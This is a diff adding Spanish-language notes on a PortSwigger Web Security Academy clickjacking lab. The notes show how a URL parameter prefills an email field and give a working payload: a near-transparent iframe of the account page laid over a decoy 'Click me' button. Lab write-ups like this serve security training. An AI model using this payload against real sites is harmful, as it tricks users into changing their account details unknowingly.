@@ -95,3 +95,38 @@ Para este ejemplo se uso sandbox="allow-forms" para desactivar las protecciones.
 src="https://0a1b004903f71dc0c0795dd000a8006a.web-security-academy.net/my-account/?email=hacker@attacker-website.com"></iframe>
 
 ```
+## Lab: Clickjacking with form input data prefilled from a URL parameter
+
+### Autocomplete de formulario
+
+<img width="669" alt="image" src="https://github.com/user-attachments/assets/db0f76b3-426b-4cf4-b5bf-b3fb2b22971f" />
+
+
+En este ejemplo el auto completar se encontraba activo del formulario entonces tu visitando la url
+
+```
+https://0a1a002003d98033b1aee474009a0090.web-security-academy.net/my-account?email=masa300@gmail.com
+```
+Puedes automaticamente llenar el campo email.
+
+```
+<style>
+    iframe {
+        position:relative;
+        width:700px;
+        height: 500px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:450px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://0a1a002003d98033b1aee474009a0090.web-security-academy.net/my-account?email=masa3@gmail.com"></iframe>
+```
+
+
